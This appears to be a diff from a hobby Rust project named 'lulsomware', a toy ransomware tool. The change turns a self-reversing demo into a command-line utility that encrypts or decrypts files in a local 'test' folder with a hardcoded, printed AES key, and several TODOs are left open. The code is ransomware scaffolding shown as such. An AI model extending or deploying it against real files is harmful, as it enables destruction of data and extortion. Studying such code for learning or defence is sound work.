@@ -2,23 +2,42 @@ extern crate bincode_aes;
 
 use std::fs::{read_dir, OpenOptions};
 use std::io::{Read, Write, Seek, SeekFrom};
-use std::{str, thread, time};
+use std::{str, env};
 use std::error::Error;
+use bincode_aes::BincodeCryptor;
+use std::process::exit;
 
 
 fn main() {
-    let demonstration_time = time::Duration::from_secs(2);
-    encrypt_all();
-    println!("Oops... all your important files are encrypted.");
-    thread::sleep(demonstration_time);
-    decrypt_all();
-}
+    println!("Encrypt: lulsomware.exe encrypt [directory]");
+    println!("Decrypt: lulsomware.exe decrypt [directory] [key]");
+    let args: Vec<String> = env::args().collect();
 
-fn encrypt_all() {
-    let x = "abcdefghijklmnopqrstuvwxyz012345";
-    let key = bincode_aes::create_key(x.as_bytes().to_vec()).unwrap();
+    let human_readable_encryption_key = "abcdefghijklmnopqrstuvwxyz012345";
+    let key = bincode_aes::create_key(human_readable_encryption_key.as_bytes().to_vec()).unwrap();
     let crypt = bincode_aes::with_key(key);
 
+    if args.len() < 2 {
+        eprintln!("You didn't specify what do you want to do!");
+        exit(1);
+    }
+
+    println!("Save this key: {}", human_readable_encryption_key);
+
+    // TODO: allow specifying working directory
+    // TODO: better handling of args
+    // TODO: test with non-text files (images, binaries, etc) - Optional
+    // TODO: allow specifying an encryption key, and default to a random one
+    if args[1].as_str() == "encrypt" {
+        encrypt_all(&crypt);
+    } else if args[1].as_str() == "decrypt" {
+        let _key = args[2].as_str();
+        println!("Debug [key] -> {}", _key);
+        decrypt_all(&crypt);
+    }
+}
+
+fn encrypt_all(crypt: &BincodeCryptor) {
     let directory_entries = read_dir("test").expect("Can't read");
 
     for entry in directory_entries {
@@ -36,11 +55,7 @@ fn encrypt_all() {
     }
 }
 
-fn decrypt_all() {
-    let x = "abcdefghijklmnopqrstuvwxyz012345";
-    let key = bincode_aes::create_key(x.as_bytes().to_vec()).unwrap();
-    let crypt = bincode_aes::with_key(key);
-
+fn decrypt_all(crypt: &BincodeCryptor) {
     let directory_entries = read_dir("test").expect("Can't read");
 
     for entry in directory_entries {
